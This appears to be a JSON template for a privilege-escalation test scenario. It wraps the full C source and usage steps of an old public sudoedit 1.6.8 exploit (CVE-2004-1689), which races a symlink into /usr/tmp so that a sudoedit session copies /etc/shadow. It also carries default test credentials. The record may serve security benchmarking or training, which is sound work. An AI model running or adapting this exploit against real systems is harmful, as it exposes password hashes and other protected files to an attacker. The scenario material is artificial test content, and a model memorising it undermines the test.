@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_470",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: SudoEdit 1.6.8 - Local Change Permission (OSVDB-10023;CVE-2004-1689)\n\nExploit source code (470.c):\n```\n/*\n\n       Copyright © Rosiello Security 2004\n            http://www.rosiello.org\n\n                 sudoedit Exploit\n\n\nSOFTWARE : sudoedit\nREFERENCE: http://www.sudo.ws/sudo/alerts/sudoedit.html\nDATE: 18/09/2004\n\nSummary:\nA flaw in exists in sudo's -u option (aka sudoedit)\nin sudo version 1.6.8 that can give an attacker\nread permission to a file that would otherwise be\nunreadable.\n\nSudo versions affected:\n1.6.8 only\n\nCredit:\nReznic Valery discovered the problem.\n\n-----------------------------------------------------------\n\nAll the information that you can find in this software\nwere published for educational and didactic purpose only.\nThe author published this program under the condition\nthat is not in the intention of the reader to use them\nin order to bring to himself or others a profit or to bring\nto others damage.\n\n!Respect the law!\n\nHow do I use this code ?\n\nTo exploit sudoedit you have to open with it the\nfile \"rosiello\" as shown in the example.\n\nEXAMPLE SCENARIO:\n\n1) Open two shells (i) and (ii);\n2) (i)$sudoedit rosiello;\n3) (ii)$./sudoedit-exploit /etc/shadow;\n4) (i) close sudoedit.\n\nThe file \"rosiello\" is now a copy of \"/etc/shadow\".\n\nAUTHOR : Angelo Rosiello\nCONTACT: angelo rosiello org\n\n*/\n\n#include <stdio.h>\n#include <sys/stat.h>\n#include <string.h>\n#include <sys/types.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <dirent.h>\n\n\nint main( int argc, char *argv[] )\n{\n    char PATH[]=\"/usr/tmp\";\n    char file[32];\n       DIR *tmp;\n       struct dirent *de;\n       tmp = opendir ( PATH );\n    int found = 0;\n\n    printf( \"Copyright Â© Rosiello Security 2004\\n\" );\n    printf( \"http://www.rosiello.org\\n\" );\n\n    if( argc!=2 )\n    {\n        printf( \"USAGE: %s file\\n\", argv[0] );\n        return( 0 );\n    }\n\n\n    while ( (de = readdir ( tmp ))!= NULL )\n    {\n        if ( (strstr(de->d_name, \"rosiello\") != NULL) )\n           {\n            if( strlen(de->d_name) > 24 ) return( 0 );\n            sprintf( file, \"%s/%s\", PATH, (char *)de->d_name );\n            remove( file );\n            if( fork()!=0 )\n            {\n                execl( \"/bin/ln\", \"ln\", \"-s\", argv[1], file, NULL );\n            }\n            wait( );\n            printf( \"Now you can close sudoedit and reopen rosiello!\\n\" );\n            found=1;\n            goto end;\n\n        }\n\n       }\n    end:\n    closedir( tmp );\n\n    if( !found )\n        printf( \"File Not Found!\\n\" );\n    return( 0 );\n\n}\n\n\n// milw0rm.com [2004-09-21]\n```",
+  "cve": "OSVDB-10023;CVE-2004-1689",
+  "exploitdb_id": "470",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_470",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
